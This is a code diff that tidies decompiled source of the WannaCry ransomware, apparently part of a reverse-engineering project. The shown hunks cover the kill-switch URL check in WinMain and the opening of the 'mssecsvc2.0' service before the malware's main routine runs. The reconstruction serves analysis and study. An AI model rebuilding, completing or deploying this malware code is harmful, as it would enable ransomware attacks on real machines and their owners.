@@ -1,6 +1,3 @@
-#include <string.h>
-#include <stdio.h>
-
 typedef unsigned char   undefined;
 
 typedef unsigned int    ImageBaseOffset32;
@@ -6921,6 +6918,7 @@ void wannacry_real_entry(void) {
 
   hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
   if (hSCManager != (SC_HANDLE)0x0) {
+    //s_mssecsvc2_0_004312fc = "mssecsvc2.0"
     hSCObject = OpenServiceA(hSCManager,s_mssecsvc2_0_004312fc,0xf01ff);
     if (hSCObject != (SC_HANDLE)0x0) {
       FUN_00407fa0(hSCObject,0x3c);
@@ -6952,19 +6950,15 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nC
 
   killswitch_url_copy = killswitch_url_buffer;
   
-  //strncpy(killswitch_url_copy, killswitch_url, 14);
-  while (i != 0) {
-    i = i + -1;
-    *(undefined4 *)killswitch_url_copy = *(undefined4 *)killswitch_url;
-    killswitch_url = killswitch_url + 4;
-    killswitch_url_copy = killswitch_url_copy + 4;
-  }
+  strncpy(killswitch_url_copy, killswitch_url, 14);
+  
 
   *killswitch_url_copy = *killswitch_url;
-  InternetOpenA((LPCSTR)0x0, 1, (LPCSTR)0x0, (LPCSTR)0x0, 0);
-  hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, (LPCSTR)0x0, 0, 0x84000000, 0);
+  InternetOpenA(NULL, 1, NULL, NULL, 0);
+  hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, NULL, 0, 0x84000000, 0);
 
-  if (hinternet_return == (HINTERNET)0x0) {
+  //if url request fails
+  if (hinternet_return == NULL) {
     InternetCloseHandle(hInternet);
     InternetCloseHandle(0);
     wannacry_real_entry();
